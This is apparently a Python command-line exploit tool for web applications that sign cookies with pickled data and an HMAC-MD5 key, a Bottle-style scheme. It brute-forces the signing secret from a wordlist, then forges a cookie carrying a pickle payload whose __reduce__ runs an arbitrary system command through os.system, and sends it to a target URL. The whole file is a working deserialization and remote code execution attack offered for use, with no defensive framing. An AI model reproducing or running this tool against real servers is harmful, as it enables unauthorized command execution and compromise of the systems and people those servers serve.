import argparse
import base64
import hmac
import hashlib
import pickle
import os
import time
import requests
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

console = Console()

class RCE:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))
    
    def forge_cookie_and_send_request(self, key, url=None, cookie_name=None):
        encoder_decoder = CookieEncoderDecoder(key)
        forged_cookie = encoder_decoder.encode_rce(self.cmd)
        
        if url:
            try:
                if cookie_name:
                    cookies = {cookie_name: forged_cookie.decode()}
                requests.get(url, cookies=cookies, timeout=3)
                console.print(f"[bold][green]Request sent with forged cookie:[/green][/bold]")
            except requests.Timeout:
                console.print("[bold red]Error:[/bold red] Request timed out")
                exit(1)
            except requests.RequestException as e:
                console.print(f"[bold red]Error sending request:[/bold red] {e}")
                exit(1)

class CookieEncoderDecoder:
    def __init__(self, key=None):
        self.key = key
        self.basestring = str
        self.unicode = str

    def touni(self, s, enc='utf8', err='strict'):
        return s.decode(enc, err) if isinstance(s, bytes) else self.unicode(s)

    def tob(self, s, enc='utf8'):
        return s.encode(enc) if isinstance(s, self.unicode) else bytes(s)

    def cookie_is_encoded(self, data):
        ''' Return True if the argument looks like an encoded cookie.'''
        return bool(data.startswith(self.tob('!')) and self.tob('?') in data)

    def _lscmp(self, a, b):
        ''' Compares two strings in a cryptographically safe way:
            Runtime is not affected by length of common prefix. '''
        return not sum(0 if x == y else 1 for x, y in zip(a, b)) and len(a) == len(b)

    def decode(self, data):
        ''' Verify and decode an encoded string. Return an object or None.'''
        data = self.tob(data)
        if self.cookie_is_encoded(data):
            sig, msg = data.split(self.tob('?'), 1)
            expected_sig = base64.b64encode(hmac.new(self.tob(self.key), msg, digestmod=hashlib.md5).digest())
            if self._lscmp(sig[1:], expected_sig):
                return pickle.loads(base64.b64decode(msg))
        return None

    def encode(self, data):
        ''' Encode and sign a pickle-able object. Return a (byte) string '''
        msg = base64.b64encode(pickle.dumps(data, -1))
        sig = base64.b64encode(hmac.new(self.tob(self.key), msg, digestmod=hashlib.md5).digest())
        return self.tob('!') + sig + self.tob('?') + msg

    def encode_rce(self, cmd):
        ''' Encode and sign a custom pickled object (RCE). Return a (byte) string '''
        rce_instance = RCE(cmd)
        data = ("name", {"name": rce_instance})
        msg = base64.b64encode(pickle.dumps(data, protocol=pickle.HIGHEST_PROTOCOL))
        sig = base64.b64encode(hmac.new(self.tob(self.key), msg, digestmod=hashlib.md5).digest())
        return self.tob('!') + sig + self.tob('?') + msg

    def dictionary_attack(self, cookie, wordlist_path):
        ''' Attempt to decode the cookie using a dictionary attack.'''
        if not os.path.exists(wordlist_path):
            console.print(f"[red]Wordlist file {wordlist_path} not found.[/red]")
            return None

        start_time = time.time()
        with open(wordlist_path, 'r') as file:
            lines = file.readlines()
            with Progress(
                SpinnerColumn(),
                BarColumn(),
                "[progress.percentage]{task.percentage:>3.1f}%",
                "•",
                TextColumn("[cyan]Trying key: [bold blue]{task.fields[key]}[/bold blue]"),
                TimeElapsedColumn(),
                console=console
            ) as progress:
                task = progress.add_task("[cyan]Attempting keys...", total=len(lines), key="")
                for line in lines:
                    potential_key = line.strip()
                    self.key = potential_key
                    decoded = self.decode(cookie)
                    progress.update(task, advance=1, key=potential_key)
                    if decoded is not None:
                        progress.stop()
                        console.print(f"\n[bold][blue]Found valid key:[/blue] [green]{potential_key}[/green][/bold]")
                        end_time = time.time()
                        console.print(f"[bold][blue]Execution time:[blue] [green]{end_time - start_time:.2f} seconds[/green][/bold]")
                        return decoded
        console.print("\n[bold red][!] No valid key found in wordlist.[/bold red]")
        end_time = time.time()
        console.print(f"[bold red][@] Execution time: {end_time - start_time:.2f} seconds[/bold red]")
        return None


def main():
    parser = argparse.ArgumentParser(description='Encode or decode cookies.')
    parser.add_argument('action', choices=['encode', 'decode', 'dict-attack', 'rce'], help='Action to perform: encode, decode, dict-attack, or rce')
    parser.add_argument('-c', '--cookie', required=True, help='The cookie to encode or decode')
    parser.add_argument('-k', '--key', help='The secret key for encoding, decoding, or custom encoding')
    parser.add_argument('-w', '--wordlist', help='Path to the wordlist for dictionary attack')
    parser.add_argument('-m', '--cmd', help='System command to execute for RCE encoding (required for rce action)')
    parser.add_argument('-u', '--url', help='URL to send request with forged cookie (optional for rce action)')
    args = parser.parse_args()

    if args.action in ['encode', 'decode', 'rce'] and not args.key:
        parser.error('--key is required for encode, decode, and rce actions')

    encoder_decoder = CookieEncoderDecoder(args.key)

    if args.action == 'decode':
        decoded_cookie = encoder_decoder.decode(args.cookie)
        if decoded_cookie is not None:
            console.print(f"[bold][blue]Decoded cookie:[/blue][green] {decoded_cookie}[/green][/bold]")
        else:
            console.print(f"[bold red][!] Failed to decode cookie with the provided key.[/ bold red]")
    elif args.action == 'encode':
        data = eval(args.cookie)
        encoded_cookie = encoder_decoder.encode(data)
        console.print(f"[bold][blue]Encoded cookie:[/blue] [green]{encoded_cookie.decode()}[/green][/bold]")
    elif args.action == 'rce':
        if not args.cmd:
            parser.error('--cmd is required for rce action')
        
        rce_instance = RCE(args.cmd)
        # Convert the cookie string to a tuple and get the first element (Cookie Key)
        cookie_name = eval(args.cookie)[0]
        rce_instance.forge_cookie_and_send_request(args.key, args.url, cookie_name)
        
        encoded_cookie = encoder_decoder.encode_rce(args.cmd)
        console.print(f"[bold green]{encoded_cookie.decode()}[/bold green]")
    elif args.action == 'dict-attack':
        if not args.wordlist:
            parser.error('--wordlist is required for dict-attack action')
        decoded_cookie = encoder_decoder.dictionary_attack(args.cookie, args.wordlist)
        if decoded_cookie is not None:
            console.print(f"[bold][blue]Decoded cookie:[/blue][green] {decoded_cookie}[/green][/bold]")

if __name__ == '__main__':
    main()
